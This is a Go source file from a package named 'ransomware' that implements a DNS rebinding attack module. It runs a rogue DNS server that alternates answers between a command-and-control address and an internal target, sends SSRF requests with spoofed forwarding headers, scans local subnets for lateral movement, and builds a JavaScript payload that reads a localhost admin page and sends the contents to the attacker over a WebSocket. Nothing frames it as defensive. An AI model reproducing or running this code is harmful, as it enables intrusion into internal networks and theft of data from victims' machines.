package ransomware

import (
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type DNSRebinding struct {
	config       *RansomwareConfig
	listenPort   int
	attackDomain string
	targetIP     string
	c2Server     string
}

func NewDNSRebinding(cfg *RansomwareConfig) *DNSRebinding {
	return &DNSRebinding{
		config:       cfg,
		listenPort:   53,
		attackDomain: "cdn.x404x-edge.net",
	}
}

func (d *DNSRebinding) StartRebindServer(c2Server string) error {
	d.c2Server = c2Server

	go func() {
		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", d.listenPort))
		if err != nil {
			return
		}

		conn, err := net.ListenUDP("udp", addr)
		if err != nil {
			return
		}
		defer conn.Close()

		buf := make([]byte, 512)
		for {
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil {
				return
			}

			query := d.parseDNSQuery(buf[:n])
			response := d.buildRebindResponse(buf[:n], query)
			conn.WriteToUDP(response, remote)
		}
	}()

	return nil
}

func (d *DNSRebinding) parseDNSQuery(data []byte) string {
	if len(data) < 13 {
		return ""
	}

	var name string
	pos := 12
	for {
		if pos >= len(data) {
			break
		}
		length := int(data[pos])
		if length == 0 {
			break
		}
		if pos+1+length > len(data) {
			break
		}
		if name != "" {
			name += "."
		}
		name += string(data[pos+1 : pos+1+length])
		pos += length + 1
	}
	return name
}

func (d *DNSRebinding) buildRebindResponse(query []byte, domain string) []byte {
	response := make([]byte, 512)

	copy(response[0:2], query[0:2])
	response[2] = 0x81
	response[3] = 0x80
	response[4] = 0x00
	response[5] = 0x01
	response[6] = 0x00
	response[7] = 0x01

	copy(response[12:], query[12:])
	pos := 12 + len(domain) + 6

	response[pos] = 0xC0
	response[pos+1] = 0x0C
	response[pos+2] = 0x00
	response[pos+3] = 0x01
	response[pos+4] = 0x00
	response[pos+5] = 0x01

	ttl := uint32(0)
	if d.shouldRebind() {
		ttl = 1
	} else {
		ttl = 300
	}

	response[pos+6] = byte(ttl >> 24)
	response[pos+7] = byte(ttl >> 16)
	response[pos+8] = byte(ttl >> 8)
	response[pos+9] = byte(ttl)

	response[pos+10] = 0x00
	response[pos+11] = 0x04

	if d.shouldRebind() {
		ip := net.ParseIP(d.targetIP)
		if ip != nil {
			ip4 := ip.To4()
			copy(response[pos+12:pos+16], ip4)
			return response[:pos+16]
		}
	}

	ip := net.ParseIP(d.c2Server)
	if ip == nil {
		ip = net.ParseIP("10.0.0.1")
	}
	ip4 := ip.To4()
	copy(response[pos+12:pos+16], ip4)
	return response[:pos+16]
}

func (d *DNSRebinding) shouldRebind() bool {
	return time.Now().Unix()%4 < 2
}

func (d *DNSRebinding) SSRFAttack(targetURL string, payload string) (string, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return "", err
	}

	req.Host = d.attackDomain
	req.Header.Set("X-Forwarded-For", "127.0.0.1")
	req.Header.Set("X-Real-IP", "127.0.0.1")
	req.Header.Set("X-Original-URL", payload)
	req.Header.Set("X-Rewrite-URL", payload)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 || resp.StatusCode == 301 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "127.0.0.1") || strings.Contains(location, "localhost") {
			req2, _ := http.NewRequest("GET", location, nil)
			resp2, _ := client.Do(req2)
			if resp2 != nil {
				defer resp2.Body.Close()
				buf := make([]byte, 4096)
				resp2.Body.Read(buf)
				return string(buf), nil
			}
		}
	}

	buf := make([]byte, 4096)
	resp.Body.Read(buf)
	return string(buf), nil
}

func (d *DNSRebinding) LateralNetworkScan(subnet string) []string {
	var targets []string

	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			fmt.Sprintf("1..254 | ForEach-Object { Test-Connection -ComputerName %s.$_ -Count 1 -Quiet } | Select-String -Pattern 'True'", subnet))
		out, _ := cmd.CombinedOutput()
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "True") {
				targets = append(targets, fmt.Sprintf("%s.254", subnet))
			}
		}
		if len(targets) > 0 {
			return targets
		}
	}

	base := strings.TrimSuffix(subnet, ".0")
	base = strings.TrimSuffix(base, ".0/24")
	for i := 1; i <= 254; i++ {
		ip := fmt.Sprintf("%s.%d", base, i)
		conn, err := net.DialTimeout("tcp", ip+":80", 200*time.Millisecond)
		if err == nil {
			conn.Close()
			targets = append(targets, ip)
			if len(targets) >= 10 {
				break
			}
		}
	}

	return targets
}

func (d *DNSRebinding) SOPBypassPayload(originServer string) string {
	return fmt.Sprintf(`<script>
var ws = new WebSocket('ws://%s:8080/rebind');
ws.onmessage = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://127.0.0.1:8080/admin?'+e.data, true);
    xhr.send();
    xhr.onload = function() {
        ws.send(btoa(xhr.responseText));
    };
};
</script>`, originServer)
}

func (d *DNSRebinding) FullDNSRebindingSuite(c2Server string) map[string]interface{} {
	result := make(map[string]interface{})

	d.StartRebindServer(c2Server)
	result["rebind_server"] = fmt.Sprintf("listening on :%d", d.listenPort)
	result["attack_domain"] = d.attackDomain
	result["c2_server"] = d.c2Server

	payload := d.SOPBypassPayload(c2Server)
	result["sop_bypass_payload"] = payload[:minInt(100, len(payload))] + "..."

	targets := d.LateralNetworkScan("192.168.1.0")
	result["lateral_targets"] = targets
	result["target_count"] = len(targets)

	return result
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var (
	_ = rand.Int
	_ = http.ErrUseLastResponse
)
